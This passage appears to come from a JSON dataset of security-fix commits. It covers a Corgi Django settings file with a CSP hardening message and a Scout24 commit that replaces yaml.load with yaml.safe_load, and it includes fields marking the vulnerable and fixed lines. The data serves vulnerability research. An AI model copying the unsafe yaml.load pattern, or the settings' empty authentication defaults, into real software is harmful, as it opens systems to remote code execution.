CELERY_WORKER_PREFETCH_MULTIPLIER=1 CELERY_TASK_IGNORE_RESULT=False CELERY_TASK_TRACK_STARTED=True CELERY_TASK_ACKS_LATE=True CELERY_RESULT_EXPIRES=None CELERY_TASK_ROUTES=( [ (\"corgi.tasks.*.slow_*\",{\"queue\": \"slow\"}), (\"corgi.tasks.*.cpu_*\",{\"queue\": \"cpu\"}), (\"*\",{\"queue\": \"fast\"}), ], ) REST_FRAMEWORK={ \"DEFAULT_FILTER_BACKENDS\":[\"django_filters.rest_framework.DjangoFilterBackend\"], \"DEFAULT_AUTHENTICATION_CLASSES\":( ), \"DEFAULT_PERMISSION_CLASSES\":[ ], \"DEFAULT_RENDERER_CLASSES\":[ \"rest_framework.renderers.JSONRenderer\", \"rest_framework.renderers.BrowsableAPIRenderer\", ], \"DEFAULT_PAGINATION_CLASS\": \"rest_framework.pagination.LimitOffsetPagination\", \"PAGE_SIZE\": 10, \"DEFAULT_SCHEMA_CLASS\": \"drf_spectacular.openapi.AutoSchema\", \"EXCEPTION_HANDLER\": \"corgi.api.exception_handlers.exception_handler\", } UMB_CERT=os.getenv(\"CORGI_UMB_CERT\") UMB_KEY=os.getenv(\"CORGI_UMB_KEY\") UMB_CONSUMER_ID=os.getenv(\"CORGI_UMB_CONSUMER_ID\") UMB_SUBSCRIPTION_ID=os.getenv(\"CORGI_UMB_SUBSCRIPTION_ID\") UMB_CONSUMER=f\"{UMB_CONSUMER_ID}.{UMB_SUBSCRIPTION_ID}\" UMB_BROKER_URL=os.getenv(\"CORGI_UMB_BROKER_URL\") UMB_BREW_MONITOR_ENABLED=strtobool(os.getenv(\"CORGI_UMB_BREW_MONITOR_ENABLED\", \"true\")) COMMUNITY_PRODUCTS_ENABLED=strtobool(os.getenv(\"CORGI_COMMUNITY_PRODUCTS_ENABLED\", \"false\")) BREW_URL=os.getenv(\"CORGI_BREW_URL\") BREW_WEB_URL=os.getenv(\"CORGI_BREW_WEB_URL\") BREW_DOWNLOAD_ROOT_URL=os.getenv(\"CORGI_BREW_DOWNLOAD_ROOT_URL\") RHEL_COMPOSE_BASE_URL=os.getenv(\"CORGI_TEST_DOWNLOAD_URL\") PRODSEC_DASHBOARD_URL=os.getenv(\"CORGI_PRODSEC_DASHBOARD_URL\") ERRATA_TOOL_URL=os.getenv(\"CORGI_ERRATA_TOOL_URL\") PULP_URL=os.getenv(\"CORGI_PULP_URL\") PULP_USERNAME=os.getenv(\"CORGI_PULP_USERNAME\") PULP_PASSWORD=os.getenv(\"CORGI_PULP_PASSWORD\") SPECTACULAR_SETTINGS={ \"SWAGGER_UI_DIST\": \"SIDECAR\", \"SWAGGER_UI_FAVICON_HREF\": \"SIDECAR\", \"REDOC_DIST\": \"SIDECAR\", \"TITLE\": \"Component Registry API\", \"DESCRIPTION\": \"REST API auto-generated docs for Component Registry\", \"VERSION\": CORGI_VERSION, \"SWAGGER_UI_SETTINGS\":{\"supportedSubmitMethods\":[]}, } APP_STREAMS_LIFE_CYCLE_URL=os.getenv(\"CORGI_APP_STREAMS_LIFE_CYCLE_URL\", \"\") MANIFEST_HINTS_URL=os.getenv(\"CORGI_MANIFEST_HINTS_URL\") LOOKASIDE_CACHE_BASE_URL=f\"https:\/\/{os.getenv('CORGI_LOOKASIDE_CACHE_URL')}\/repo\" SCA_ENABLED=strtobool(os.getenv(\"CORGI_SCA_ENABLED\", \"true\")) SCA_SCRATCH_DIR=os.getenv(\"CORGI_SCA_SCATCH_DIR\", \"\/tmp\") ","sourceWithComments":"import os\nfrom distutils.util import strtobool\nfrom pathlib import Path\n\n# noinspection PyPep8Naming\nfrom config.utils import get_env\nfrom corgi import __version__ as CORGI_VERSION\n\n# Build paths inside the project like this: BASE_DIR \/ \"subdir\".\nBASE_DIR = Path(__file__).resolve().parent.parent.parent\n\n# Added\nCA_CERT = os.getenv(\"REQUESTS_CA_BUNDLE\")\n\nDEBUG = False\n\n# Mail these people on uncaught exceptions that result in 500 errors\n# Also mail these people once a day if any Celery task failed in the past 24 hours\n# Technically, \"twice a day\" - you'll get an email from stage and prod\nADMINS = [\n    tuple(name_and_email.split(\";\")) for name_and_email in os.getenv(\"CORGI_ADMINS\", \"\").split(\",\")\n]\n\nDOCS_URL = os.getenv(\"CORGI_DOCS_URL\")\nOPENSHIFT_BUILD_COMMIT = os.getenv(\"OPENSHIFT_BUILD_COMMIT\")\nPRODSEC_EMAIL = os.getenv(\"PRODSEC_EMAIL\")\n\nCORGI_DOMAIN = os.getenv(\"CORGI_DOMAIN\")\nif CORGI_DOMAIN:\n    CSRF_COOKIE_DOMAIN = CORGI_DOMAIN\n    LANGUAGE_COOKIE_DOMAIN = CORGI_DOMAIN\n    SESSION_COOKIE_DOMAIN = CORGI_DOMAIN\n\nEMAIL_HOST = os.getenv(\"CORGI_EMAIL_HOST\", \"localhost\")\nEMAIL_PORT = 1025 if EMAIL_HOST == \"localhost\" else 25\nEMAIL_USE_TLS = False if EMAIL_HOST == \"localhost\" else True\nSERVER_EMAIL = os.getenv(\"CORGI_SERVER_EMAIL\", \"root@localhost\")\nDEFAULT_FROM_EMAIL = SERVER_EMAIL\n\nAPPEND_SLASH = False  # Default: True\n# If True, and request URL doesn't match any patterns in URLconf\n# and request URL doesn\u2019t end in slash\n# HTTP redirect is issued to same URL with slash appended\n# Note that the redirect may cause any data submitted in a POST request to be lost\n# With False, our URLconf controls. \"api\/path\/\" won't match, should give a 404\n# Only \"api\/path\" should succeed\n\n# Cookie settings\nCSRF_COOKIE_HTTPONLY = True\nCSRF_COOKIE_SECURE = True\nCSRF_COOKIE_NAME = \"corgi_csrf_token\"\nCSRF_COOKIE_SAMESITE = \"Strict\"\n\nLANGUAGE_COOKIE_HTTPONLY = True\nLANGUAGE_COOKIE_SECURE = True\nLANGUAGE_COOKIE_NAME = \"corgi_language\"\nLANGUAGE_COOKIE_SAMESITE = \"Strict\"\n\nSESSION_COOKIE_HTTPONLY = True  # Django default\nSESSION_COOKIE_SECURE = True\nSESSION_COOKIE_NAME = \"corgi_session_id\"\nSESSION_COOKIE_SAMESITE = \"Strict\"\n\n# Traffic from OCP router to Django is via HTTP. Because the TLS route is edge terminated,\n# HTTP features that need a secure connection use the below Django setting in stage \/ prod\n# to tell Django the connection is secure. Otherwise Django \"sees\" that the connection\n# from the client is via HTTP, and does not send HSTS headers, for example\n# The OpenShift router \/ HAProxy instance MUST force setting these headers,\n# overwriting them if already present\n# Otherwise bad clients can trick Django into thinking the connection is secure when it isn't\n# See https:\/\/docs.djangoproject.com\/en\/4.0\/ref\/settings\/#secure-proxy-ssl-header\n# SECURE_PROXY_SSL_HEADER = (\"HTTP_X_FORWARDED_PROTO\", \"https\")\n\n# Security headers\nSECURE_HSTS_SECONDS = 15768000  # 182.5 days, i.e. 6 months\nSECURE_HSTS_INCLUDE_SUBDOMAINS = True  # Adds includeSubDomains to Strict-Transport-Security header\n# SECURE_SSL_REDIRECT = True  # This causes an infinite redirect loop due to edge termination\n\nSECURE_CONTENT_TYPE_NOSNIFF = True  # Header: X-Content-Type-Options: nosniff\nSECURE_BROWSER_XSS_FILTER = True  # Header: X-XSS-Protection: 1; mode=block\nX_FRAME_OPTIONS = \"DENY\"  # Header: X-Frame-Options DENY\n\n# Content Security Policy\nCSP_STYLE_SRC = (\n    \"'self'\",\n    # Inline styles generated by Django-REST-Framework for syntax highlighting\n    \"'sha512-JWyI0O03Zg7yL2CuIaqUpB5SsITGjnbsdcl+R+S1KgDFcAF+SaYLQpiOvV4y9s3RFceDkcPSmo557Y6aIOe+\"\n    + \"Sw=='\",\n    # Inline styles generated by DRF-Spectacular for API documentation\n    \"'sha512-F9xfkMd5AAuiwcrWne2TQOC\/IV9cbM10EBJ+Wo\/+lu0RaeQOj6T8ucgwI9mgpDaK0FT\/YGD5Hrc\/Bne\/\"\n    + \"Q3Ovvg=='\",\n    \"https:\/\/cdnjs.cloudflare.com\",\n)\n\nCSP_FONT_SRC = (\n    \"'self'\",\n    \"https:\/\/cdnjs.cloudflare.com\",\n)\n\nCSP_SCRIPT_SRC = (\n    \"'self'\",\n    \"https:\/\/cdnjs.cloudflare.com\",\n)\n\nCSP_IMG_SRC = (\n    \"'self'\",\n    \"data:\",\n)\n\nCSP_DEFAULT_SRC = (\n    \"'self'\",\n    \"data:\",\n)\n\n# RFC 5322 datetime format used in web UIs, nicer to read than ISO8601\n# Ex: 'Thu, 21 Dec 2000 16:01:07 +0200'\nDATETIME_FORMAT = \"r\"\n\n# Application definition\nINSTALLED_APPS = [\n    \"django.contrib.auth\",\n    \"django.contrib.contenttypes\",\n    \"django.contrib.sessions\",\n    \"django.contrib.messages\",\n    \"django.contrib.staticfiles\",\n    \"django.contrib.humanize\",\n    \"django.contrib.postgres\",\n    \"django_celery_results\",\n    \"django_celery_beat\",\n    \"drf_spectacular\",\n    \"drf_spectacular_sidecar\",\n    \"mptt\",\n    \"rest_framework\",\n    \"django_filters\",\n    \"corgi.api\",\n    \"corgi.core\",\n    \"corgi.collectors\",\n    \"corgi.monitor\",\n    \"corgi.tasks\",\n    \"corgi.web\",\n]\n\nMIDDLEWARE = [\n    \"django.middleware.security.SecurityMiddleware\",\n    \"whitenoise.middleware.WhiteNoiseMiddleware\",\n    \"django.contrib.sessions.middleware.SessionMiddleware\",\n    \"django.middleware.common.CommonMiddleware\",\n    \"django.middleware.csrf.CsrfViewMiddleware\",\n    \"django.contrib.auth.middleware.AuthenticationMiddleware\",\n    \"django.contrib.messages.middleware.MessageMiddleware\",\n    \"django.middleware.clickjacking.XFrameOptionsMiddleware\",\n    \"django.middleware.gzip.GZipMiddleware\",\n    \"csp.middleware.CSPMiddleware\",\n]\n\nROOT_URLCONF = \"config.urls\"\n\n# Type annotation needed so test.py can set keys in OPTIONS dict\nTEMPLATES: list[dict] = [\n    {\n        \"BACKEND\": \"django.template.backends.django.DjangoTemplates\",\n        \"DIRS\": [str(BASE_DIR \/ \"corgi\/web\/templates\")],\n        \"APP_DIRS\": True,\n        \"OPTIONS\": {\n            \"context_processors\": [\n                \"django.template.context_processors.debug\",\n                \"django.template.context_processors.request\",\n                \"django.contrib.auth.context_processors.auth\",\n                \"django.contrib.messages.context_processors.messages\",\n            ],\n        },\n    },\n]\n\nWSGI_APPLICATION = \"config.wsgi.application\"\n\n# Splunk friendly key\/value pairs\nLOG_FORMAT_START = (\n    \"%(asctime)s.%(msecs)03d+00:00 thread=%(thread)d, name=%(name)s, lineno=%(lineno)d\"\n)\nLOG_FORMAT_END = f'level=%(levelname)s, app=corgi, environ={get_env()}, msg=\"%(message)s\"'\n# Splunk friendly timestamp\nLOG_DATE_FORMAT = \"%Y-%m-%dT%H:%M:%S\"\n\nLOGGING = {\n    \"version\": 1,\n    \"disable_existing_loggers\": False,\n    \"formatters\": {\n        \"default\": {\n            \"format\": f\"{LOG_FORMAT_START}, {LOG_FORMAT_END}\",\n            \"datefmt\": f\"{LOG_DATE_FORMAT}\",\n        },\n    },\n    \"filters\": {\n        \"require_debug_false\": {\n            \"()\": \"django.utils.log.RequireDebugFalse\",\n        },\n    },\n    \"handlers\": {\n        \"console\": {\n            \"class\": \"logging.StreamHandler\",\n            \"formatter\": \"default\",\n        },\n        # Email ERROR or higher to settings.ADMINS when DEBUG = False\n        \"mail_admins\": {\n            \"class\": \"django.utils.log.AdminEmailHandler\",\n            \"filters\": [\"require_debug_false\"],\n            \"level\": \"ERROR\",\n        },\n    },\n    \"root\": {\n        \"handlers\": [\"console\"],\n        \"level\": \"WARNING\",\n    },\n    \"loggers\": {\n        \"django\": {\"handlers\": [\"console\"], \"level\": \"WARNING\"},\n        # Mail errors only, but set level=WARNING here to pass warnings up to parent loggers\n        \"django.request\": {\"handlers\": [\"mail_admins\"], \"level\": \"WARNING\"},\n        \"corgi\": {\"handlers\": [\"console\"], \"level\": \"INFO\", \"propagate\": False},\n    },\n}\n\n# Database\nDATABASES = {\n    \"default\": {\n        \"ENGINE\": \"django.db.backends.postgresql\",\n        \"NAME\": os.getenv(\"CORGI_DB_NAME\", \"corgi-db\"),\n        \"USER\": os.getenv(\"CORGI_DB_USER\", \"corgi-db-user\"),\n        \"PASSWORD\": os.getenv(\"CORGI_DB_PASSWORD\", \"test\"),\n        \"HOST\": os.getenv(\"CORGI_DB_HOST\", \"localhost\"),\n        \"PORT\": os.getenv(\"CORGI_DB_PORT\", \"5432\"),\n        # Prefer password authentication even if a valid Kerberos ticket exists on the system.\n        # See: https:\/\/www.postgresql.org\/docs\/devel\/libpq-connect.html#LIBPQ-CONNECT-GSSENCMODE\n        \"OPTIONS\": {\"gssencmode\": \"disable\"},\n    }\n}\n\n# Default primary key field type\nDEFAULT_AUTO_FIELD = \"django.db.models.BigAutoField\"\n\n# Internationalization\nLANGUAGE_CODE = \"en-us\"\nTIME_ZONE = \"UTC\"\nUSE_I18N = False\nUSE_L10N = False\nUSE_TZ = True\n\n# Static files (CSS, JavaScript, Images)\nSTATIC_URL = \"\/static\/\"\nSTATIC_ROOT = str(BASE_DIR \/ \"staticfiles\")\nSTATICFILES_STORAGE = \"whitenoise.storage.CompressedManifestStaticFilesStorage\"\n\n# Celery config\nCELERY_BROKER_URL = os.getenv(\"CORGI_REDIS_URL\", \"redis:\/\/redis:6379\")\n\nCELERY_RESULT_BACKEND = \"django-db\"\n# Retry tasks due to Postgres failures instead of immediately re-raising exceptions\n# See https:\/\/docs.celeryproject.org\/en\/stable\/userguide\/configuration.html for details\n# See also a django-celery-results decorator for individual tasks:\n# https:\/\/django-celery-results.readthedocs.io\/en\/latest\/reference\/django_celery_results.managers.html\nCELERY_RESULT_BACKEND_ALWAYS_RETRY = True\nCELERY_RESULT_BACKEND_MAX_RETRIES = 2\n\n# Set a global 15-minute task timeout. Override this on individual tasks by decorating them with:\n# @app.task(soft_time_limit=<TIME_IN_SECONDS>)\nCELERY_TASK_SOFT_TIME_LIMIT = 900\n# CELERY_SINGLETON_LOCK_EXPIRY and redis visibility timeout must never be less than the below value\nCELERY_LONGEST_SOFT_TIME_LIMIT = 2400\n\nCELERY_WORKER_CONCURRENCY = 5  # defaults to CPU core count, which breaks in OpenShift\n\n# Disable task prefetching, which caused connection timeouts and other odd task failures in SDEngine\nCELERY_WORKER_PREFETCH_MULTIPLIER = 1\n\n# Store the return values of each task in the TaskResult.result attribute; can be used for\n# informational logging.\nCELERY_TASK_IGNORE_RESULT = False\n\n# Track the start time of each task by creating its TaskResult as soon as it enters the STARTED\n# state. This allows us to measure task execution time of each task by `date_done - date_created`.\nCELERY_TASK_TRACK_STARTED = True\n\n# Do not acknowledge task until completion\n# Otherwise tasks may be lost when nodes evict Celery worker pods\nCELERY_TASK_ACKS_LATE = True\n\n# Disable task result expiration:\n# https:\/\/docs.celeryproject.org\/en\/latest\/userguide\/configuration.html#std-setting-result_expires\n# By default, this job is enabled and runs daily at 4am. Disable to keep UMB-triggered task results\nCELERY_RESULT_EXPIRES = None\n\nCELERY_TASK_ROUTES = (\n    [\n        (\"corgi.tasks.*.slow_*\", {\"queue\": \"slow\"}),  # Any module's slow_* tasks go to 'slow' queue\n        (\"corgi.tasks.*.cpu_*\", {\"queue\": \"cpu\"}),  # Any module's cpu* tasks go to 'cpu' queue\n        (\"*\", {\"queue\": \"fast\"}),  # default other tasks go to 'fast'\n    ],\n)\n\n\n# Django REST Framework\n# https:\/\/www.django-rest-framework.org\/\nREST_FRAMEWORK = {\n    \"DEFAULT_FILTER_BACKENDS\": [\"django_filters.rest_framework.DjangoFilterBackend\"],\n    \"DEFAULT_AUTHENTICATION_CLASSES\": (\n        # \"rest_framework.authentication.BasicAuthentication\",\n        # \"rest_framework.authentication.SessionAuthentication\",\n    ),\n    \"DEFAULT_PERMISSION_CLASSES\": [\n        # \"rest_framework.permissions.IsAuthenticated\",\n    ],\n    \"DEFAULT_RENDERER_CLASSES\": [\n        \"rest_framework.renderers.JSONRenderer\",\n        \"rest_framework.renderers.BrowsableAPIRenderer\",\n    ],\n    \"DEFAULT_PAGINATION_CLASS\": \"rest_framework.pagination.LimitOffsetPagination\",\n    \"PAGE_SIZE\": 10,\n    \"DEFAULT_SCHEMA_CLASS\": \"drf_spectacular.openapi.AutoSchema\",\n    \"EXCEPTION_HANDLER\": \"corgi.api.exception_handlers.exception_handler\",\n}\n\n\n# UMB -- Unified Message Bus\nUMB_CERT = os.getenv(\"CORGI_UMB_CERT\")\nUMB_KEY = os.getenv(\"CORGI_UMB_KEY\")\n\nUMB_CONSUMER_ID = os.getenv(\"CORGI_UMB_CONSUMER_ID\")\nUMB_SUBSCRIPTION_ID = os.getenv(\"CORGI_UMB_SUBSCRIPTION_ID\")\nUMB_CONSUMER = f\"{UMB_CONSUMER_ID}.{UMB_SUBSCRIPTION_ID}\"\n\nUMB_BROKER_URL = os.getenv(\"CORGI_UMB_BROKER_URL\")\n\n# Set to False to turn off the brew umb listener.\n# True values are y, yes, t, true, on and 1; false values are n, no, f, false, off and 0\n# https:\/\/docs.python.org\/3\/distutils\/apiref.html#distutils.util.strtobool\nUMB_BREW_MONITOR_ENABLED = strtobool(os.getenv(\"CORGI_UMB_BREW_MONITOR_ENABLED\", \"true\"))\n\n# Set to True to turn on loading of community products from product-definitions.\nCOMMUNITY_PRODUCTS_ENABLED = strtobool(os.getenv(\"CORGI_COMMUNITY_PRODUCTS_ENABLED\", \"false\"))\n\n# Brew\nBREW_URL = os.getenv(\"CORGI_BREW_URL\")\nBREW_WEB_URL = os.getenv(\"CORGI_BREW_WEB_URL\")\nBREW_DOWNLOAD_ROOT_URL = os.getenv(\"CORGI_BREW_DOWNLOAD_ROOT_URL\")\n\n# RHEL Compose\nRHEL_COMPOSE_BASE_URL = os.getenv(\"CORGI_TEST_DOWNLOAD_URL\")\n\n# ProdSec Dashboard\nPRODSEC_DASHBOARD_URL = os.getenv(\"CORGI_PRODSEC_DASHBOARD_URL\")\n\n# Errata Tool\nERRATA_TOOL_URL = os.getenv(\"CORGI_ERRATA_TOOL_URL\")\n\n# Pulp\nPULP_URL = os.getenv(\"CORGI_PULP_URL\")\nPULP_USERNAME = os.getenv(\"CORGI_PULP_USERNAME\")\nPULP_PASSWORD = os.getenv(\"CORGI_PULP_PASSWORD\")\n\n# Settings for the drf-spectacular package\nSPECTACULAR_SETTINGS = {\n    \"SWAGGER_UI_DIST\": \"SIDECAR\",  # shorthand to use the sidecar instead\n    \"SWAGGER_UI_FAVICON_HREF\": \"SIDECAR\",\n    \"REDOC_DIST\": \"SIDECAR\",\n    \"TITLE\": \"Component Registry API\",\n    \"DESCRIPTION\": \"REST API auto-generated docs for Component Registry\",\n    \"VERSION\": CORGI_VERSION,\n    \"SWAGGER_UI_SETTINGS\": {\"supportedSubmitMethods\": []},\n}\n\n# URL where lifecycle collector fetches application streams from\nAPP_STREAMS_LIFE_CYCLE_URL = os.getenv(\"CORGI_APP_STREAMS_LIFE_CYCLE_URL\", \"\")\n\n# Manifest hints url\nMANIFEST_HINTS_URL = os.getenv(\"CORGI_MANIFEST_HINTS_URL\")\n\nLOOKASIDE_CACHE_BASE_URL = f\"https:\/\/{os.getenv('CORGI_LOOKASIDE_CACHE_URL')}\/repo\"\n\n# Set to False to disable software composition analysis tasks.\nSCA_ENABLED = strtobool(os.getenv(\"CORGI_SCA_ENABLED\", \"true\"))\nSCA_SCRATCH_DIR = os.getenv(\"CORGI_SCA_SCATCH_DIR\", \"\/tmp\")\n"}},"msg":"List exact file paths to avoid insecure host-based CSP whitelisting\n\n\"cdnjs.cloudflare.com\" hosts Angular libraries. If there is any\nHTML injection bug in Corgi, whitelisting that domain lets an\nattacker include the Angular libs and achieve code execution.\n\nBest practices suggest using hash- or nonce-based whitelisting\ninstead of host-based whitelisting.\nBut external stylesheet hashes aren't supported in Chrome \/ Firefox.\nOnly inline style elements \/ style attributes can be allowed via a hash.\nExternal script hashes are supported in Chrome, but not in Firefox.\nSo we list the path instead.\n\nSubResource Integrity hashes on the remote resource protect us\nwhen an attacker changes the content of the remote file on the CDN,\nbut don't protect us from HTML injection bugs in Corgi itself\n(attackers just inject new dependencies with no \/ a valid SRI hash).\nWhitelisting the exact path in our CSP does prevent the above.\nSo both together should be secure."}},"https:\/\/github.com\/Scout24\/monitoring-config-generator":{"2191fe6c5a850ddcf7a78f7913881cef1677500d":{"url":"https:\/\/api.github.com\/repos\/Scout24\/monitoring-config-generator\/commits\/2191fe6c5a850ddcf7a78f7913881cef1677500d","html_url":"https:\/\/github.com\/Scout24\/monitoring-config-generator\/commit\/2191fe6c5a850ddcf7a78f7913881cef1677500d","sha":"2191fe6c5a850ddcf7a78f7913881cef1677500d","keyword":"remote code execution prevent","diff":"diff --git a\/src\/main\/python\/monitoring_config_generator\/yaml_tools\/readers.py b\/src\/main\/python\/monitoring_config_generator\/yaml_tools\/readers.py\nindex 645ab0f..50888cf 100644\n--- a\/src\/main\/python\/monitoring_config_generator\/yaml_tools\/readers.py\n+++ b\/src\/main\/python\/monitoring_config_generator\/yaml_tools\/readers.py\n@@ -57,7 +57,7 @@ def get_from_header(field):\n         return response.headers[field] if field in response.headers else None\n \n     if response.status_code == 200:\n-        yaml_config = yaml.load(response.content)\n+        yaml_config = yaml.safe_load(response.content)\n         etag = get_from_header('etag')\n         mtime = get_from_header('last-modified')\n         mtime = datetime.datetime.strptime(mtime, '%a, %d %b %Y %H:%M:%S %Z').strftime('%s') if mtime else int(time())\n","message":"","files":{"\/src\/main\/python\/monitoring_config_generator\/yaml_tools\/readers.py":{"changes":[{"diff":"\n         return response.headers[field] if field in response.headers else None\n \n     if response.status_code == 200:\n-        yaml_config = yaml.load(response.content)\n+        yaml_config = yaml.safe_load(response.content)\n         etag = get_from_header('etag')\n         mtime = get_from_header('last-modified')\n         mtime = datetime.datetime.strptime(mtime, '%a, %d %b %Y %H:%M:%S %Z').strftime('%s') if mtime else int(time())\n","add":1,"remove":1,"filename":"\/src\/main\/python\/monitoring_config_generator\/yaml_tools\/readers.py","badparts":["        yaml_config = yaml.load(response.content)"],"goodparts":["        yaml_config = yaml.safe_load(response.content)"]},{"diff":"\n         return response.headers[field] if field in response.headers else None\n \n     if response.status_code == 200:\n-        yaml_config = yaml.load(response.content)\n+        yaml_config = yaml.safe_load(response.content)\n         etag = get_from_header('etag')\n         mtime = get_from_header('last-modified')\n         mtime = datetime.datetime.strptime(mtime, '%a, %d %b %Y %H:%M:%S %Z').strftime('%s') if mtime else int(time())\n","add":1,"remove":1,"filename":"\/src\/main\/python\/monitoring_config_generator\/yaml_tools\/readers.py","badparts":["        yaml_config = yaml.load(response.content)"],"goodparts":["        yaml_config = yaml.safe_load(response.content)"]}],"source":"\nimport datetime import os import os.path import urlparse import socket from time import localtime, strftime, time from requests.exceptions import RequestException, ConnectionError, Timeout import requests import yaml from monitoring_config_generator.exceptions import MonitoringConfigGeneratorException, HostUnreachableException from monitoring_config_generator.yaml_tools.merger import merge_yaml_files def is_file(parsed_uri): return parsed_uri.scheme in['', 'file'] def is_host(parsed_uri): return parsed_uri.scheme in['http', 'https'] def read_config(uri): uri_parsed=urlparse.urlparse(uri) if is_file(uri_parsed): return read_config_from_file(uri_parsed.path) elif is_host(uri_parsed): return read_config_from_host(uri) else: raise ValueError('Given url was not acceptable %s' % uri) def read_config_from_file(path): yaml_config=merge_yaml_files(path) etag=None mtime=os.path.getmtime(path) return yaml_config, Header(etag=etag, mtime=mtime) def read_config_from_host(url): try: response=requests.get(url) except socket.error as e: msg=\"Could not open socket for '%s', error: %s\" %(url, e) raise HostUnreachableException(msg) except ConnectionError as e: msg=\"Could not establish connection for '%s', error: %s\" %(url, e) raise HostUnreachableException(msg) except Timeout as e: msg=\"Connect timed out for '%s', error: %s\" %(url, e) raise HostUnreachableException(msg) except RequestException as e: msg=\"Could not get monitoring yaml from '%s', error: %s\" %(url, e) raise MonitoringConfigGeneratorException(msg) def get_from_header(field): return response.headers[field] if field in response.headers else None if response.status_code==200: yaml_config=yaml.load(response.content) etag=get_from_header('etag') mtime=get_from_header('last-modified') mtime=datetime.datetime.strptime(mtime, '%a, %d %b %Y %H:%M:%S %Z').strftime('%s') if mtime else int(time()) else: msg=\"Request %s returned with status %s. I don't know how to handle that.\" %(url, response.status_code) raise MonitoringConfigGeneratorException(msg) return yaml_config, Header(etag=etag, mtime=mtime) class Header(object): MON_CONF_GEN_COMMENT=' ETAG_COMMENT=' MTIME_COMMMENT=' def __init__(self, etag=None, mtime=0): self.etag=etag self.mtime=int(mtime) def __nonzero__(self): return self.etag is None and self.mtime is 0 def __eq__(self, other): return self.etag==other.etag and self.mtime==other.mtime def __repr__(self): return \"Header(%s, %d)\" %(self.etag, self.mtime) def is_newer_than(self, other): if self.etag !=other.etag or self.etag is None: return cmp(self.mtime, other.mtime) > 0 else: return False def serialize(self): lines=[] time_string=strftime(\"%Y-%m-%d %H:%M:%S\", localtime()) lines.append(\"%s on %s\" %(Header.MON_CONF_GEN_COMMENT, time_string)) if self.etag: lines.append(\"%s%s\" %(Header.ETAG_COMMENT, self.etag)) if self.mtime: lines.append(\"%s%d\" %(Header.MTIME_COMMMENT, self.mtime)) return lines @staticmethod def parse(file_name): etag, mtime=None, 0 def extract(comment, current_value): value=None if line.startswith(comment): value=line.rstrip()[len(comment):] return value or current_value try: with open(file_name, 'r') as config_file: for line in config_file.xreadlines(): etag=extract(Header.ETAG_COMMENT, etag) mtime=extract(Header.MTIME_COMMMENT, mtime) if etag and mtime: break except IOError as e: pass finally: return Header(etag=etag, mtime=mtime) ","sourceWithComments":"import datetime\nimport os\nimport os.path\nimport urlparse\nimport socket\nfrom time import localtime, strftime, time\n\nfrom requests.exceptions import RequestException, ConnectionError, Timeout\nimport requests\nimport yaml\n\nfrom monitoring_config_generator.exceptions import MonitoringConfigGeneratorException, HostUnreachableException\nfrom monitoring_config_generator.yaml_tools.merger import merge_yaml_files\n\ndef is_file(parsed_uri):\n    return parsed_uri.scheme in ['', 'file']\n\n\ndef is_host(parsed_uri):\n    return parsed_uri.scheme in ['http', 'https']\n\n\ndef read_config(uri):\n    uri_parsed = urlparse.urlparse(uri)\n    if is_file(uri_parsed):\n        return read_config_from_file(uri_parsed.path)\n    elif is_host(uri_parsed):\n        return read_config_from_host(uri)\n    else:\n        raise ValueError('Given url was not acceptable %s' % uri)\n\n\ndef read_config_from_file(path):\n    yaml_config = merge_yaml_files(path)\n    etag = None\n    mtime = os.path.getmtime(path)\n    return yaml_config, Header(etag=etag, mtime=mtime)\n\n\ndef read_config_from_host(url):\n    try:\n        response = requests.get(url)\n    except socket.error as e:\n        msg = \"Could not open socket for '%s', error: %s\" % (url, e)\n        raise HostUnreachableException(msg)\n    except ConnectionError as e:\n        msg = \"Could not establish connection for '%s', error: %s\" % (url, e)\n        raise HostUnreachableException(msg)\n    except Timeout as e:\n        msg = \"Connect timed out for '%s', error: %s\" % (url, e)\n        raise HostUnreachableException(msg)\n    except RequestException as e:\n        msg = \"Could not get monitoring yaml from '%s', error: %s\" % (url, e)\n        raise MonitoringConfigGeneratorException(msg)\n\n    def get_from_header(field):\n        return response.headers[field] if field in response.headers else None\n\n    if response.status_code == 200:\n        yaml_config = yaml.load(response.content)\n        etag = get_from_header('etag')\n        mtime = get_from_header('last-modified')\n        mtime = datetime.datetime.strptime(mtime, '%a, %d %b %Y %H:%M:%S %Z').strftime('%s') if mtime else int(time())\n    else:\n        msg = \"Request %s returned with status %s. I don't know how to handle that.\" % (url, response.status_code)\n        raise MonitoringConfigGeneratorException(msg)\n\n    return yaml_config, Header(etag=etag, mtime=mtime)\n\n\nclass Header(object):\n    MON_CONF_GEN_COMMENT = '# Created by MonitoringConfigGenerator'\n    ETAG_COMMENT = '# ETag: '\n    MTIME_COMMMENT = '# MTime: '\n\n    def __init__(self, etag=None, mtime=0):\n        self.etag = etag\n        self.mtime = int(mtime)\n\n    def __nonzero__(self):\n        return self.etag is None and self.mtime is 0\n\n    def __eq__(self, other):\n        return self.etag == other.etag and self.mtime == other.mtime\n\n    def __repr__(self):\n        return \"Header(%s, %d)\" % (self.etag, self.mtime)\n\n    def is_newer_than(self, other):\n        if self.etag != other.etag or self.etag is None:\n            return cmp(self.mtime, other.mtime) > 0\n        else:\n            return False\n\n    def serialize(self):\n        lines = []\n        time_string = strftime(\"%Y-%m-%d %H:%M:%S\", localtime())\n        lines.append(\"%s on %s\" % (Header.MON_CONF_GEN_COMMENT, time_string))\n        if self.etag:\n            lines.append(\"%s%s\" % (Header.ETAG_COMMENT, self.etag))\n        if self.mtime:\n            lines.append(\"%s%d\" % (Header.MTIME_COMMMENT, self.mtime))\n        return lines\n\n    @staticmethod\n    def parse(file_name):\n        etag, mtime = None, 0\n\n        def extract(comment, current_value):\n            value = None\n            if line.startswith(comment):\n                value = line.rstrip()[len(comment):]\n            return value or current_value\n\n        try:\n            with open(file_name, 'r') as config_file:\n                for line in config_file.xreadlines():\n                    etag = extract(Header.ETAG_COMMENT, etag)\n                    mtime = extract(Header.MTIME_COMMMENT, mtime)\n                    if etag and mtime:\n                        break\n        except IOError as e:\n            # it is totally fine to not have an etag, in that case there\n            # will just be no caching and the server will have to deliver the data again\n            pass\n        finally:\n            return Header(etag=etag, mtime=mtime)\n"}},"msg":"Prevent remote code execution\n\nyaml.load() allows the provider of the yaml data (in this case: the monitored\nhost) to run arbitrary commands."},"a4b01b72d2e3d6ec2600c384a77f675fa9bbf6b7":{"url":"https:\/\/api.github.com\/repos\/Scout24\/monitoring-config-generator\/commits\/a4b01b72d2e3d6ec2600c384a77f675fa9bbf6b7","html_url":"https:\/\/github.com\/Scout24\/monitoring-config-generator\/commit\/a4b01b72d2e3d6ec2600c384a77f675fa9bbf6b7","sha":"a4b01b72d2e3d6ec2600c384a77f675fa9bbf6b7","keyword":"remote code execution 